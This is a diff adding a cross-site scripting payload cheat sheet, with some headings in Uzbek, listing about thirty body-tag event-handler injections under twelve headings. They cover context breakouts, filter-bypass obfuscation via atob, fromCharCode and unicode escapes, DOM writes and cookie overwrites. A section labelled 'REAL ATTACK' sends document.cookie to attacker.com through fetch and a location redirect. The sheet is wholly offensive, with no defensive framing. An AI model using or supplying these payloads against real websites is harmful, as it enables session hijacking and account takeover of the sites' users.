@@ -1,0 +1,101 @@
+🔥 ULTIMATE BODY / EVENT XSS (CLEAN)
+
+⸻
+
+1. CORE (ENG MUHIM)
+
+<body onload=alert(1)>
+<body onload=prompt(1)>
+<body onload=confirm(1)>
+
+
+⸻
+
+2. CONTEXT BREAKOUT
+
+"><body onload=alert(1)>
+'><body onload=alert(1)>
+
+
+⸻
+
+3. DATA EXTRACTION (REAL ATTACK)
+
+<body onload=alert(document.cookie)>
+<body onload=fetch('//attacker.com?c='+document.cookie)>
+<body onload=location='//attacker.com?c='+document.cookie>
+
+
+⸻
+
+4. ADVANCED JS EXECUTION
+
+<body onload=eval('alert(1)')>
+<body onload=new Function('alert(1)')()>
+<body onload=setTimeout(alert,0,1)>
+
+
+⸻
+
+5. EVENT VARIATIONS (MUHIM)
+
+<body onpageshow=alert(1)>
+<body onfocus=alert(1)>
+<body onhashchange=alert(1)>
+<body onclick=alert(1)>
+
+
+⸻
+
+6. OBFUSCATION / BYPASS
+
+<body onload=\u0061lert(1)>
+<body onload=alert(String.fromCharCode(88,83,83))>
+<body onload=eval(atob("YWxlcnQoMSk="))>
+
+
+⸻
+
+7. ATTRIBUTE BYPASS
+
+<body/onload=alert(1)>
+<body onload = alert(1)>
+<body onload=alert(1)//>
+
+
+⸻
+
+8. DOM-BASED EXECUTION
+
+<body onload=document.write(document.cookie)>
+<body onload=innerHTML=location.hash>
+
+
+⸻
+
+9. POLYGLOT / PARSER ABUSE
+
+</title><body onload=alert(1)>
+
+
+⸻
+
+10. MODERN JS
+
+<body onload=alert`1`>
+<body onload=(()=>alert(1))()>
+
+
+⸻
+
+11. COOKIE MANIPULATION
+
+<body onload=document.cookie="xss=1">
+
+
+⸻
+
+12. RARE BUT USEFUL
+
+<body onload=throw alert(1)>
+<body onload=onerror=alert;throw 1>
